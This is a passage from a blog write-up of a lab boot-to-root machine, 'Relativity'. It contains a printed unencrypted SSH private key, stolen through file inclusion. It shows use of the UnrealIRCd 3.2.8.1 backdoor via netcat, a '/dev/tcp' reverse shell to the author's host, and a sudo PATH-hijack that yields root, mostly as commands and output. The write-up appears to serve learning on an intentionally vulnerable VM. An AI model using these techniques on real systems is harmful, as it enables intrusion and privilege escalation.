</span><span class='line'><span class="k">include</span> <span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<h3>gaining further access</h3>

<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>

<figure class='code'><figcaption><span>User mauk&#8217;s private SSH key:</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
</span><span class='line'>9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
</span><span class='line'>5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
</span><span class='line'>zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
</span><span class='line'>ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
</span><span class='line'>xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
</span><span class='line'>tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
</span><span class='line'>jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
</span><span class='line'>f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
</span><span class='line'>r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
</span><span class='line'>Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
</span><span class='line'>BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
</span><span class='line'>MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
</span><span class='line'>szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
</span><span class='line'>YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
</span><span class='line'>+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
</span><span class='line'>3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
</span><span class='line'>Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
</span><span class='line'>3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
</span><span class='line'>ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
</span><span class='line'>dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
</span><span class='line'>J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
</span><span class='line'>ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
</span><span class='line'>bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
</span><span class='line'>aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg<span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>

<figure class='code'><figcaption><span>SSH access as mauk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh mauk@192.168.56.21 -i key</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>

<h3>enumerating the next step</h3>

<p>Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>

<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>

<figure class='code'><figcaption><span>Mauks bash_history</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat .bash_history
</span><span class='line'>
</span><span class='line'>ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
</span><span class='line'>su -
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>su -
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>

<h3>good &lsquo;ol irc</h3>

<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>

<figure class='code'><figcaption><span>Relativity IRC</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Connecting…
</span><span class='line'>Connected
</span><span class='line'>*** Looking up your hostname...
</span><span class='line'>*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>Logged in
</span><span class='line'>Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
</span><span class='line'>Your host is relativity.localdomain, running version Unreal3.2.8.1
</span><span class='line'>This server was created Thu Feb 28 2013 at 17:54:35 EST
</span><span class='line'>relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
</span><span class='line'>UHNAMES NAMESX SAFELIST HCN <span class="nv">MAXCHANNELS</span><span class="o">=</span>10 <span class="nv">CHANLIMIT</span><span class="o">=</span><span class="c">#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server</span>
</span><span class='line'>WALLCHOPS <span class="nv">WATCH</span><span class="o">=</span>128 <span class="nv">WATCHOPTS</span><span class="o">=</span>A <span class="nv">SILENCE</span><span class="o">=</span>15 <span class="nv">MODES</span><span class="o">=</span>12 <span class="nv">CHANTYPES</span><span class="o">=</span><span class="c"># PREFIX=(qaohv)~&amp;@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&amp;@%+ are supported by this server</span>
</span><span class='line'>EXCEPTS INVEX <span class="nv">CMDS</span><span class="o">=</span>KNOCK,MAP,DCCALLOW,USERIP are supported by this server
</span><span class='line'>There are 1 users and 0 invisible on 1 servers
</span><span class='line'>I have 1 clients and 0 servers
</span><span class='line'>Current Local Users: 1  Max: 1
</span><span class='line'>Current Global Users: 1  Max: 1
</span><span class='line'>- relativity.localdomain Message of the Day -
</span><span class='line'>- 9/7/2013 9:17
</span><span class='line'>-     __________       .__          __  .__      .__  __
</span><span class='line'>-     <span class="se">\_</span>_____   <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span> _____ _/  <span class="p">|</span>_<span class="p">|</span>__<span class="p">|</span>__  _<span class="p">|</span>__<span class="p">|</span>/  <span class="p">|</span>_ ___.__.
</span><span class='line'>-      <span class="p">|</span>       _// __ <span class="se">\|</span>  <span class="p">|</span> <span class="se">\_</span>_  <span class="se">\\</span>   __<span class="se">\ </span> <span class="se">\ </span> <span class="se">\/</span> /  <span class="se">\ </span>  __&lt;   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>    <span class="p">|</span>   <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>__/ __ <span class="se">\|</span>  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>  /<span class="p">|</span>  <span class="o">||</span>  <span class="p">|</span>  <span class="se">\_</span>__  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>____<span class="p">|</span>_  /<span class="se">\_</span>__  &gt;____<span class="o">(</span>____  /__<span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="se">\_</span>/ <span class="p">|</span>__<span class="o">||</span>__<span class="p">|</span>  / ____<span class="p">|</span> ·VM·
</span><span class='line'>-             <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>                        <span class="se">\/</span>
</span><span class='line'>End of /MOTD command.
</span></code></pre></td></tr></table></div></figure>


<p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution &ndash; Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>

<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>

<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>

<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>

<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>

<figure class='code'><figcaption><span>Testing UnrealIRCD backdoor</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># echo &quot;AB; ls -lah /home/ &gt; /tmp/1&quot; | nc 127.0.0.1 6667</span>
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>:relativity.localdomain 451 AB<span class="p">;</span> :You have not registered
</span><span class='line'>^C
</span></code></pre></td></tr></table></div></figure>


<p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>

<figure class='code'><figcaption><span>UnrealIRCD backdoor testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat /tmp/1
</span><span class='line'>total 16K
</span><span class='line'>drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
</span><span class='line'>dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
</span><span class='line'>drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
</span><span class='line'>drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
</span></code></pre></td></tr></table></div></figure>


<p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo "AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1" | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>

<figure class='code'><figcaption><span>Back connect shell for jetta</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -vnlp 6676</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6676 ...
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 53493
</span><span class='line'>bash: no job control in this shell
</span><span class='line'><span class="o">[</span>jetta@Relativity Unreal<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>

<figure class='code'><figcaption><span>auth_server Test run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>ls -lah auth_server/auth_server
</span><span class='line'>ls -lah auth_server/auth_server
</span><span class='line'>-rwxr-xr-x 1 root root 7.9K Mar  8  2013 auth_server/auth_server
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>auth_server/auth_server
</span><span class='line'>auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...- ____________________________
</span><span class='line'>/ Windows 2000 is out!       <span class="se">\</span>
</span><span class='line'><span class="p">|</span>                            <span class="p">|</span>
</span><span class='line'><span class="se">\ </span>-- PC Magazine, April 2013 /
</span><span class='line'> ----------------------------
</span><span class='line'>        <span class="se">\ </span>  ^__^
</span><span class='line'>         <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span><span class="se">\_</span>______
</span><span class='line'>            <span class="o">(</span>__<span class="o">)</span><span class="se">\ </span>      <span class="o">)</span><span class="se">\/\</span>
</span><span class='line'>                <span class="o">||</span>----w <span class="p">|</span>
</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
</span><span class='line'>could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>

<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>

<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>

<h3>the shortest straw</h3>

<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>

<figure class='code'><figcaption><span>auth_server Strings-ed</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># strings auth_server</span>
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>fflush
</span><span class='line'>puts
</span><span class='line'>putchar
</span><span class='line'><span class="nb">printf</span>
</span><span class='line'>poll
</span><span class='line'>stdout
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>l<span class="nv">$ </span>L
</span><span class='line'>t<span class="k">$(</span>L
</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...
</span><span class='line'><span class="k">done</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...
</span><span class='line'>could not establish connection
</span><span class='line'>invalid certificates
</span><span class='line'>error: <span class="o">(</span>12<span class="k">)</span>
</span><span class='line'>fortune -s <span class="p">|</span> /usr/bin/cowsay
</span><span class='line'>Starting Auth server..
</span><span class='line'><span class="p">;</span>*3<span class="nv">$&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>

<figure class='code'><figcaption><span>jetta&#8217;s sudo -l</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>jetta on this host:
</span><span class='line'>    requiretty, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span>
</span><span class='line'><span class="s2">    LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS</span>
</span><span class='line'><span class="s2">    LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span>
</span><span class='line'><span class="s2">    LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER</span>
</span><span class='line'><span class="s2">    LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span>
</span><span class='line'><span class="s2">    XAUTHORITY PATH&quot;</span>, env_reset
</span><span class='line'>
</span><span class='line'>User jetta may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/jetta/auth_server/auth_serveyr
</span><span class='line'>sh-4.2<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>

<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>

<h3>finishing off</h3>

<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>

<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>

<figure class='code'><figcaption><span>auth_server Exploitation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="sb">```</span>@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">hash</span> -r
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo auth_server/auth_server
</span><span class='line'>sudo auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>

<figure class='code'><figcaption><span>root shell and flag.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -lvp 6677</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6677 ...
</span><span class='line'>192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 38267
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
